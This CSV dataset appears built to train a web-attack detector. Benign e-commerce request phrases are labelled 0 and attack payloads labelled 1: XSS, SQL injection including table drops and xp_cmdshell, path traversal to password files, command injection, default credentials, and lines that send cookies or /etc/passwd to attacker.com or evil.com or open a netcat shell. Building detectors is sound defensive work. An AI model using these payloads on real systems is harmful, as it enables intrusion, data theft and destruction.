text,label
refund support contact request req1126,0
<script>alert('XSS')</script>,1
/etc/passwd%00,1
/var/log/apache2/access.log,1
at apply checkout req1141,0
"1 UNION SELECT @@version,NULL--",1
request for support refund contact req419,0
for update address account req600,0
link password reset email req259,0
username=admin&password=abc123,1
profile format upload picture req34,0
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
change arabic to language req460,0
admin' AND 1=1--,1
for policy view return product req839,0
account address billing req647,0
500 100 filter req1104,0
../../.git/config,1
"';alert(String.fromCharCode(88,83,83))//",1
<video src=1 onerror=alert(1)>,1
apply name brand by filter req439,0
<ScRiPt>alert(1)</ScRiPt>,1
address for billing req960,0
GET /web.config HTTP/1.1,1
<svg><script>alert(1)</script></svg>,1
../../../../var/www/html/config.php,1
get feed articles news latest req835,0
terms conditions and view page req278,0
id=2 OR 1=1,1
<svg><script>alert(1)</script></svg>,1
id=2 OR 1=1,1
password reset link email via req1099,0
specifications two compare req443,0
admin'--,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
apply name brand filter by req813,0
product return view policy req169,0
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
enable two authentication factor req601,0
username=admin'/*,1
repeated authentication failure admin account locked,1
<details open ontoggle=alert(1)>,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
settings notification panel req402,0
username=admin&password=password,1
to arabic language account req734,0
<video src=1 onerror=alert(1)>,1
feedback form submit for website req978,0
"';alert(String.fromCharCode(88,83,83))//",1
delivery express set preference to req177,0
1'; WAITFOR DELAY '0:0:5'--,1
item availability check for store req944,0
for shipping order address req409,0
; whoami,1
javascript:alert(document.cookie),1
GET /api/swagger.json HTTP/1.1,1
enable two factor authentication req828,0
../../../../proc/self/environ,1
/var/log/apache2/access.log,1
1; DROP TABLE users--,1
via share link req667,0
books about search req564,0
| uname -a,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
password spray attack detected multiple users,1
<audio src=1 onerror=alert(1)>,1
../../../etc/shadow,1
view section related products req280,0
history recommendations view on based req274,0
<div onmouseover=alert(1)>hover</div>,1
store map locations on view req708,0
<body onload=alert('XSS')>,1
on recommendations history based view req85,0
<svg onload=alert(document.domain)>,1
GET /server-status HTTP/1.1,1
jpeg upload picture req335,0
id=2 OR 1=1,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
feed news articles latest req1158,0
%3Cscript%3Ealert(1)%3C/script%3E,1
/etc/passwd%00,1
GET /.git/config HTTP/1.1,1
../../.git/config,1
brute force attempt on login endpoint from single ip,1
1' OR '1'='1,1
1' OR 1=1--,1
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
1' GROUP BY 1--,1
<input onfocus=alert(1) autofocus>,1
username=admin'/*,1
view history days 30 for last req620,0
checkout credit card with req197,0
<body background=javascript:alert(1)>,1
username=admin&password=123456,1
news latest feed get req759,0
submit for form feedback website req534,0
; ping -c 4 attacker.com,1
../../wp-config.php,1
../../../etc/shadow,1
with payment credit checkout card req614,0
; ping -c 4 attacker.com,1
GET /phpmyadmin HTTP/1.1,1
social via link product media req1058,0
../../../../proc/self/environ,1
articles latest news feed get req120,0
' OR 'x'='x,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
<details open ontoggle=alert(1)>,1
GET /admin/config.php HTTP/1.1,1
<iframe src=javascript:alert('XSS')>,1
shipping order for update req1137,0
"<iframe src=data:text/html,<script>alert(1)</script>>",1
product add 42 to id item req925,0
specifications two compare req10,0
email via password link reset req305,0
GET /api/swagger.json HTTP/1.1,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
; id,1
for form submit website feedback req461,0
login attempt failed username admin invalid credentials,1
admin'--,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
| wget http://attacker.com/shell.sh,1
username=root&password=root,1
<SCRIPT>alert('XSS')</SCRIPT>,1
GET /config.bak HTTP/1.1,1
username=root&password=root,1
1'; EXEC xp_cmdshell('whoami')--,1
category browse mobile req640,0
report as csv data export req982,0
products category by search for req498,0
product rate 5 req75,0
<svg><script>alert(1)</script></svg>,1
id=2 OR 1=1,1
; curl http://evil.com/$(cat /etc/passwd | base64),1
for account user profile dashboard get req1025,0
for shipping update address order req103,0
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
reset link password req1108,0
via link email reset password req1187,0
for category products by req934,0
repeated authentication failure admin account locked,1
$(whoami),1
by apply name filter brand req506,0
terms and view req79,0
GET /.htaccess HTTP/1.1,1
specifications two compare products req184,0
GET /console HTTP/1.1,1
GET /console HTTP/1.1,1
..\..\..\windows\system32\drivers\etc\hosts,1
1'; EXEC xp_cmdshell('whoami')--,1
GET /api/swagger.json HTTP/1.1,1
<details open ontoggle=alert(1)>,1
"1' UNION ALL SELECT NULL,NULL,NULL--",1
share via social link media req949,0
logout current session from req470,0
change to account arabic language req113,0
"1 UNION SELECT username,password FROM users--",1
<SCRIPT>alert('XSS')</SCRIPT>,1
update for account billing address req1102,0
<div onmouseover=alert(1)>hover</div>,1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
for to item save later wishlist req1085,0
<div onmouseover=alert(1)>hover</div>,1
1'; EXEC xp_cmdshell('whoami')--,1
rate product stars 5 review req957,0
<SCRIPT>alert('XSS')</SCRIPT>,1
../../wp-config.php,1
username=root&password=root,1
GET /api/swagger.json HTTP/1.1,1
panel view notification req533,0
on view map store locations req774,0
password=1' OR '1'='1' /*,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
username=administrator&password=12345,1
"<IMG SRC=`javascript:alert(""XSS"")`>",1
1' AND SLEEP(5)--,1
language change to account arabic req382,0
username=administrator&password=12345,1
related view products section req929,0
| wget http://attacker.com/shell.sh,1
42 cart id product add req51,0
specifications two compare products req783,0
<details open ontoggle=alert(1)>,1
<script>alert('XSS')</script>,1
GET /.htaccess HTTP/1.1,1
<script>alert('XSS')</script>,1
picture format jpeg upload profile req1054,0
GET /server-status HTTP/1.1,1
<ScRiPt>alert(1)</ScRiPt>,1
' OR 1=1#,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
| uname -a,1
<body background=javascript:alert(1)>,1
GET /web.config HTTP/1.1,1
to item product req802,0
GET /.htaccess HTTP/1.1,1
for order invoice download number req1032,0
GET /config.bak HTTP/1.1,1
password login username and req1114,0
username=root&password=root,1
/var/log/apache2/access.log,1
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
about search books req651,0
based history on req825,0
"; python -c 'import socket,subprocess'",1
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
../../../../proc/self/environ,1
specifications compare products req878,0
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
section products view related req805,0
articles latest news req394,0
username=admin&password=123456,1
express delivery to preference req495,0
GET /phpmyadmin HTTP/1.1,1
specifications products compare two req349,0
phones mobile browse category req686,0
GET /backup.sql HTTP/1.1,1
"; python -c 'import socket,subprocess'",1
via product link media social req766,0
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
username=admin&password=admin,1
get articles news feed req31,0
<input onfocus=alert(1) autofocus>,1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
shipment number tracking track with req8,0
| cat /etc/passwd,1
username=admin&password=letmein,1
<svg onload=alert(document.domain)>,1
%3Cscript%3Ealert(1)%3C/script%3E,1
1' GROUP BY 1--,1
"id=1 AND 1=CONVERT(int,@@version)--",1
latest feed news articles req1039,0
<SCRIPT>alert('XSS')</SCRIPT>,1
checkout with card credit payment req767,0
support seller send to message req15,0
electronics products by for category search req810,0
GET /backup.sql HTTP/1.1,1
email via link password reset req950,0
<SCRIPT>alert('XSS')</SCRIPT>,1
newest arrivals sort listing by req254,0
../../../../var/www/html/config.php,1
order 30 last view req400,0
"1 UNION SELECT @@version,NULL--",1
picture upload profile jpeg format req780,0
admin'--,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
; ping -c 4 attacker.com,1
product id 42 item to req861,0
<SCRIPT>alert('XSS')</SCRIPT>,1
brute force attempt on login endpoint from single ip,1
"1' UNION ALL SELECT NULL,NULL,NULL--",1
<img src=x onerror=alert(1)>,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
feedback for form req1016,0
rate product review req1112,0
password=1' OR '1'='1' /*,1
5 rate product stars review req1142,0
$(whoami),1
& ipconfig,1
& ipconfig,1
for to item save wishlist req203,0
GET /admin/config.php HTTP/1.1,1
; ls -la,1
map store on locations view req583,0
account email register with new req781,0
and view conditions terms req892,0
from current logout session req1111,0
username=user&password=pass,1
view for history req362,0
GET /.htaccess HTTP/1.1,1
& net user hacker Password1 /add,1
product add item 42 req1169,0
1' OR 1=1--,1
<audio src=1 onerror=alert(1)>,1
/etc/passwd%00,1
GET /crossdomain.xml HTTP/1.1,1
<iframe src=javascript:alert('XSS')>,1
<ScRiPt>alert(1)</ScRiPt>,1
new with email register req721,0
with email register req720,0
csv export data report as req840,0
1'; EXEC xp_cmdshell('whoami')--,1
get articles news feed req933,0
GET /api/swagger.json HTTP/1.1,1
to subscribe newsletter req255,0
GET /.htaccess HTTP/1.1,1
%3Cscript%3Ealert(1)%3C/script%3E,1
last view days req618,0
item save to req33,0
..%2F..%2F..%2Fetc%2Fpasswd,1
new register with account req758,0
<div onmouseover=alert(1)>hover</div>,1
<audio src=1 onerror=alert(1)>,1
store availability for check item req429,0
set to express preference req712,0
notification panel settings view req442,0
../../wp-config.php,1
../../.git/config,1
number for download invoice order req1118,0
tracking number track with req860,0
"1 UNION SELECT username,password FROM users--",1
..%2F..%2F..%2Fetc%2Fpasswd,1
logout session from current req74,0
username=admin&password=password,1
for search products category electronics by req920,0
for support refund request contact req257,0
30 for history order req922,0
javascript:alert(document.cookie),1
to send support message seller req1066,0
../../../etc/shadow,1
preference set express delivery req832,0
view map on locations req232,0
profile get user account dashboard for req1172,0
1'; EXEC xp_cmdshell('whoami')--,1
"1 UNION SELECT username,password FROM users--",1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
by 100 filter req308,0
|| nc -e /bin/sh attacker.com 4444,1
shipping for update order address req648,0
authentication factor enable two req663,0
..%2F..%2F..%2Fetc%2Fpasswd,1
id=2 OR 1=1,1
username=admin&password=admin123,1
GET /console HTTP/1.1,1
for store check item availability req20,0
GET /server-status HTTP/1.1,1
& net user hacker Password1 /add,1
item add cart 42 to product req726,0
for check availability item req894,0
<script>alert('XSS')</script>,1
order for download req1096,0
address shipping update for order req973,0
username=user&password=pass,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
password=1' OR '1'='1' /*,1
product id 42 to add req406,0
item product id req336,0
username=admin&password=letmein,1
store for availability req700,0
id=2 OR 1=1,1
username=admin&password=1234567890,1
username=root&password=root,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
locations view store map on req531,0
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
stars rate review req1074,0
multiple failed login attempts detected for admin,1
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
about search machine books learning req610,0
account address for billing update req167,0
<svg><script>alert(1)</script></svg>,1
; ls -la,1
../../../etc/shadow,1
1'; WAITFOR DELAY '0:0:5'--,1
| cat /etc/passwd,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
<div onmouseover=alert(1)>hover</div>,1
1' GROUP BY 1--,1
; ping -c 4 attacker.com,1
rate review stars product req46,0
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
1; DROP TABLE users--,1
<video src=1 onerror=alert(1)>,1
& ipconfig,1
payment checkout with card credit req880,0
; whoami,1
product review stars rate req127,0
<svg onload=alert(document.domain)>,1
arrivals listing by sort newest req64,0
account dashboard for profile user get req1163,0
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
shipping for order req437,0
order days for history last 30 req298,0
"name='; INSERT INTO users VALUES('hacker','pass')--",1
<select onfocus=alert(1) autofocus>,1
contact refund support for req1116,0
for address billing update req78,0
' OR 1=1#,1
id=2 OR 1=1,1
..\..\..\windows\system32\drivers\etc\hosts,1
|| nc -e /bin/sh attacker.com 4444,1
request support contact refund for req435,0
arrivals newest by sort listing req995,0
"1 UNION SELECT @@version,NULL--",1
later item wishlist req701,0
products section related view req649,0
panel settings view notification req132,0
apply filter by name brand req673,0
dashboard for account user get profile req822,0
%3Cscript%3Ealert(1)%3C/script%3E,1
|| nc -e /bin/sh attacker.com 4444,1
username=root&password=root,1
username=admin&password=password,1
1' AND SLEEP(5)--,1
number shipment track req175,0
request contact refund req223,0
"; python -c 'import socket,subprocess'",1
<ScRiPt>alert(1)</ScRiPt>,1
"1 UNION SELECT @@version,NULL--",1
GET /.htaccess HTTP/1.1,1
compare specifications products two req714,0
id=2 OR 1=1,1
get articles feed news req946,0
; curl http://evil.com/$(cat /etc/passwd | base64),1
brute force attempt on login endpoint from single ip,1
update order shipping req149,0
send to message seller req817,0
1'; EXEC xp_cmdshell('whoami')--,1
password login username and with req324,0
../../../../proc/self/environ,1
GET /api/swagger.json HTTP/1.1,1
php://filter/convert.base64-encode/resource=config.php,1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
preference set delivery express req16,0
username=admin&password=letmein,1
<body background=javascript:alert(1)>,1
card credit checkout with payment req116,0
GET /config.bak HTTP/1.1,1
and conditions view page terms req87,0
username=admin&password=admin123,1
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
availability store item req1036,0
view store locations req846,0
<iframe src=javascript:alert('XSS')>,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
/var/log/apache2/access.log,1
GET /wp-admin HTTP/1.1,1
address for update account billing req1049,0
"; python -c 'import socket,subprocess'",1
username=admin&password=admin,1
; whoami,1
"1 UNION SELECT @@version,NULL--",1
GET /wp-admin HTTP/1.1,1
sort listing by newest arrivals req821,0
"1 AND 1=2 UNION SELECT 1,2,3--",1
1; DROP TABLE users--,1
<div onmouseover=alert(1)>hover</div>,1
for website feedback form req999,0
logout current session from req1164,0
username=admin&password=letmein,1
specifications products compare two req287,0
<details open ontoggle=alert(1)>,1
1' OR 1=1--,1
id item cart 42 add product req969,0
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
for order update address shipping req943,0
username=admin&password=superman,1
<ScRiPt>alert(1)</ScRiPt>,1
GET /web.config HTTP/1.1,1
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
GET /config.bak HTTP/1.1,1
update for shipping order req1180,0
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
username=test&password=test,1
"1' UNION ALL SELECT NULL,NULL,NULL--",1
`id`,1
; cat /etc/shadow,1
for website feedback submit req642,0
1' OR 1=1--,1
billing update account address for req192,0
<body background=javascript:alert(1)>,1
"1 UNION SELECT @@version,NULL--",1
<svg onload=alert(document.domain)>,1
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
admin' AND 1=1--,1
GET /backup.sql HTTP/1.1,1
1'; DELETE FROM orders WHERE 1=1--,1
' OR 1=1#,1
1'; DELETE FROM orders WHERE 1=1--,1
availability store for req1161,0
upload picture jpeg req312,0
<textarea onfocus=alert(1) autofocus>,1
| uname -a,1
<svg><script>alert(1)</script></svg>,1
GET /config.bak HTTP/1.1,1
latest articles news get feed req489,0
sort arrivals by listing newest req793,0
....//....//etc/passwd,1
../../../etc/shadow,1
id=2 OR 1=1,1
username=admin&password=monkey,1
link product media social share via req595,0
books machine about search req694,0
for get account profile user req268,0
username=admin&password=monkey,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
store locations map on view req1071,0
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
cart to 42 item product add req1057,0
GET /crossdomain.xml HTTP/1.1,1
../../../../etc/passwd,1
arabic language account change to req288,0
<script>alert('XSS')</script>,1
javascript:alert(document.cookie),1
javascript:alert(document.cookie),1
<video src=1 onerror=alert(1)>,1
1'; EXEC xp_cmdshell('whoami')--,1
file:///etc/passwd,1
dashboard account profile for get user req948,0
availability for store item check req310,0
browse mobile category phones req330,0
upload format jpeg profile picture req594,0
data csv export as report req76,0
....//....//etc/passwd,1
1' AND SLEEP(5)--,1
' HAVING 1=1--,1
<textarea onfocus=alert(1) autofocus>,1
feedback form for submit website req48,0
1' GROUP BY 1--,1
billing update address account req1028,0
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
<body onload=alert('XSS')>,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
; ls -la,1
support to send message seller req265,0
1' AND SLEEP(5)--,1
and username login password req800,0
username=admin&password=letmein,1
order history view last req399,0
<details open ontoggle=alert(1)>,1
& net user hacker Password1 /add,1
newsletter to email with req578,0
machine learning about search req730,0
../../.git/config,1
with password and username login req632,0
account to change language arabic req190,0
account address update req644,0
100 range 500 filter price to req98,0
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
view map locations store on req990,0
set delivery to preference express req1154,0
' OR 'x'='x,1
multiple failed login attempts detected for admin,1
set express delivery req1167,0
' OR 1=1#,1
../../.git/config,1
electronics category by search for req492,0
express delivery to set preference req66,0
"1 UNION SELECT username,password FROM users--",1
multiple failed login attempts detected for admin,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
1' ORDER BY 10--,1
GET /web.config HTTP/1.1,1
<SCRIPT>alert('XSS')</SCRIPT>,1
file:///etc/passwd,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
refund contact support for request req133,0
media via product share link social req218,0
export csv data req1109,0
password=1' OR '1'='1' /*,1
GET /actuator/env HTTP/1.1,1
browse mobile phones category req490,0
products compare specifications req57,0
../../../../etc/passwd,1
admin'--,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
..\..\..\windows\system32\drivers\etc\hosts,1
%3Cscript%3Ealert(1)%3C/script%3E,1
account change language arabic to req222,0
refund request contact support for req552,0
username=test&password=test,1
| wget http://attacker.com/shell.sh,1
username=admin&password=123456,1
..%2F..%2F..%2Fetc%2Fpasswd,1
get articles news latest feed req111,0
apply name by brand filter req337,0
order download invoice for req779,0
two specifications products req829,0
1'; DELETE FROM orders WHERE 1=1--,1
1' GROUP BY 1--,1
dashboard profile for account user get req641,0
; whoami,1
feedback website submit req959,0
1'; DELETE FROM orders WHERE 1=1--,1
website for form feedback req158,0
<body background=javascript:alert(1)>,1
latest get articles req1145,0
<iframe src=javascript:alert('XSS')>,1
cart id 42 add item req803,0
download order number invoice for req448,0
"1 UNION SELECT @@version,NULL--",1
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
<input onfocus=alert(1) autofocus>,1
; ls -la,1
by 100 filter price req256,0
; ping -c 4 attacker.com,1
username with login and password req1068,0
return for product policy view req188,0
GET /web.config HTTP/1.1,1
authentication enable factor two req321,0
1' OR 1=1--,1
reset email link password via req465,0
feed articles get req626,0
password reset link email via req1027,0
<audio src=1 onerror=alert(1)>,1
GET /.env HTTP/1.1,1
from current session logout req1134,0
feedback for form website submit req930,0
username=admin'/*,1
format jpeg profile upload picture req867,0
/var/log/apache2/access.log,1
social via media product req22,0
form website submit feedback for req328,0
support request for contact refund req1030,0
books learning search machine about req355,0
GET /.git/config HTTP/1.1,1
; whoami,1
../../.git/config,1
username=admin&password=monkey,1
map store view on locations req319,0
view store locations on map req227,0
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
; ping -c 4 attacker.com,1
1' AND SLEEP(5)--,1
1' ORDER BY 10--,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
<audio src=1 onerror=alert(1)>,1
GET /wp-admin HTTP/1.1,1
<audio src=1 onerror=alert(1)>,1
sort by arrivals listing newest req613,0
admin' AND 1=1--,1
payment checkout with credit card req1080,0
../../../../etc/passwd,1
refund contact request support for req962,0
GET /admin/config.php HTTP/1.1,1
change arabic to language req306,0
at apply coupon checkout discount req852,0
checkout with credit card payment req1165,0
news articles feed latest req25,0
file:///etc/passwd,1
settings panel notification view req501,0
link reset via email req161,0
username=admin&password=1234567890,1
../../wp-config.php,1
username=root&password=root,1
& ipconfig,1
locations on map store view req323,0
"id=1 AND 1=CONVERT(int,@@version)--",1
latest news articles req976,0
save later item wishlist req151,0
password=1' OR '1'='1' /*,1
"id=1 AND 1=CONVERT(int,@@version)--",1
|| nc -e /bin/sh attacker.com 4444,1
1' OR '1'='1,1
section products view related req110,0
<svg onload=alert(document.domain)>,1
policy return for view product req869,0
"1' UNION ALL SELECT NULL,NULL,NULL--",1
factor enable two req53,0
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
1' GROUP BY 1--,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
<svg onload=alert(document.domain)>,1
related view products section req282,0
' OR 'x'='x,1
../.env,1
from current session logout req431,0
GET /api/swagger.json HTTP/1.1,1
username=admin&password=abc123,1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
enable authentication factor two req295,0
by filter brand apply name req942,0
1'; EXEC xp_cmdshell('whoami')--,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
books search learning machine req739,0
send support message req715,0
for address billing req122,0
1' OR '1'='1,1
<select onfocus=alert(1) autofocus>,1
express set preference delivery req970,0
|| nc -e /bin/sh attacker.com 4444,1
<video src=1 onerror=alert(1)>,1
coupon discount apply at req35,0
news feed articles get latest req416,0
30 order days req5,0
../../../../var/www/html/config.php,1
request for contact req481,0
/var/log/apache2/access.log,1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
../../.git/config,1
username=admin'/*,1
GET /crossdomain.xml HTTP/1.1,1
<video src=1 onerror=alert(1)>,1
map view locations store on req863,0
"name='; INSERT INTO users VALUES('hacker','pass')--",1
learning machine search books about req1189,0
GET /config.bak HTTP/1.1,1
GET /admin/config.php HTTP/1.1,1
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
order number for download invoice req1098,0
<body onload=alert('XSS')>,1
page terms view req1008,0
refund request contact for support req1093,0
<iframe src=javascript:alert('XSS')>,1
/etc/passwd%00,1
number order for invoice download req1125,0
view policy for product return req857,0
view notification settings panel req784,0
username=admin&password=letmein,1
admin'--,1
factor two enable authentication req283,0
for order invoice download number req682,0
1' ORDER BY 10--,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
specifications compare products req847,0
<body onload=alert('XSS')>,1
password login and username req985,0
link via share social product media req868,0
send seller to support req1012,0
link share media req653,0
/var/log/apache2/access.log,1
| cat /etc/passwd,1
admin' AND 1=1--,1
javascript:alert(document.cookie),1
../../.git/config,1
php://filter/convert.base64-encode/resource=config.php,1
discount coupon checkout req185,0
support refund for contact req296,0
contact for support req570,0
admin' AND 1=1--,1
| uname -a,1
view products section related req1183,0
address order shipping for update req231,0
for download invoice number order req137,0
contact refund support req979,0
' OR 'x'='x,1
preference express set to delivery req914,0
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
rate review stars product 5 req302,0
<object data=javascript:alert(1)>,1
update address account req300,0
admin'--,1
username=admin&password=superman,1
listing arrivals sort req4,0
username=admin&password=batman,1
repeated authentication failure admin account locked,1
delivery express to preference req543,0
<iframe src=javascript:alert('XSS')>,1
1' OR '1'='1,1
; id,1
account to change arabic language req555,0
view notification settings panel req212,0
search by electronics category for req713,0
repeated authentication failure admin account locked,1
1'; DELETE FROM orders WHERE 1=1--,1
php://filter/convert.base64-encode/resource=config.php,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
<svg onload=alert(document.domain)>,1
<textarea onfocus=alert(1) autofocus>,1
/etc/passwd%00,1
GET /server-status HTTP/1.1,1
GET /.htaccess HTTP/1.1,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
product for return req685,0
website feedback for req1086,0
website form submit for req877,0
<textarea onfocus=alert(1) autofocus>,1
upload profile format jpeg picture req309,0
username=user&password=pass,1
/var/log/apache2/access.log,1
%3Cscript%3Ealert(1)%3C/script%3E,1
"<IMG SRC=`javascript:alert(""XSS"")`>",1
newsletter with email req242,0
notification panel view settings req683,0
file:///etc/passwd,1
link via password email reset req156,0
via reset email link req731,0
username=admin&password=abc123,1
<video src=1 onerror=alert(1)>,1
GET /wp-admin HTTP/1.1,1
username=admin'/*,1
<input onfocus=alert(1) autofocus>,1
email register new account with req1007,0
repeated authentication failure admin account locked,1
1' GROUP BY 1--,1
1; DROP TABLE users--,1
; whoami,1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
check item for store availability req462,0
specifications products two compare req587,0
"1 UNION SELECT username,password FROM users--",1
for to later wishlist item req723,0
upload picture format jpeg profile req301,0
username=admin&password=123456,1
<select onfocus=alert(1) autofocus>,1
panel view settings notification req464,0
| uname -a,1
dashboard user get req459,0
"<IMG SRC=`javascript:alert(""XSS"")`>",1
address update billing for req290,0
related section products view req850,0
item to add cart product id req1047,0
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
upload profile picture jpeg req607,0
download invoice number req1115,0
search books machine req210,0
number track shipment tracking with req91,0
<svg><script>alert(1)</script></svg>,1
100 results 500 req252,0
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
<svg onload=alert(document.domain)>,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
../../../../var/www/html/config.php,1
`id`,1
username=admin&password=batman,1
get dashboard account for req316,0
preference delivery express req980,0
file:///etc/passwd,1
|| nc -e /bin/sh attacker.com 4444,1
brand name apply filter req334,0
username=admin&password=1234567890,1
login attempt failed username admin invalid credentials,1
products compare specifications two req1152,0
<audio src=1 onerror=alert(1)>,1
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
history recommendations on req285,0
with password username login req414,0
report csv data export req174,0
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
account get for req693,0
1' ORDER BY 10--,1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
<select onfocus=alert(1) autofocus>,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
"; python -c 'import socket,subprocess'",1
1' GROUP BY 1--,1
; whoami,1
"1' UNION ALL SELECT NULL,NULL,NULL--",1
admin' AND 1=1--,1
newsletter with subscribe req292,0
card with checkout credit payment req548,0
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
$(whoami),1
username=admin&password=letmein,1
<audio src=1 onerror=alert(1)>,1
<audio src=1 onerror=alert(1)>,1
../../../../etc/passwd,1
username=admin&password=monkey,1
<textarea onfocus=alert(1) autofocus>,1
../../wp-config.php,1
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
mobile category phones browse req42,0
../../wp-config.php,1
php://filter/convert.base64-encode/resource=config.php,1
add cart to id req204,0
GET /actuator/env HTTP/1.1,1
GET /server-status HTTP/1.1,1
password=1' OR '1'='1' /*,1
../../../../etc/passwd,1
password=1' OR '1'='1' /*,1
GET /admin/config.php HTTP/1.1,1
data export report req1078,0
brute force attempt on login endpoint from single ip,1
id cart item add 42 product req205,0
../../.git/config,1
| wget http://attacker.com/shell.sh,1
view return product for policy req931,0
seller message send to req502,0
<select onfocus=alert(1) autofocus>,1
export csv data as report req147,0
credit checkout card with req293,0
password and username with login req142,0
enable two authentication factor req384,0
1' AND SLEEP(5)--,1
GET /wp-admin HTTP/1.1,1
subscribe with newsletter to email req807,0
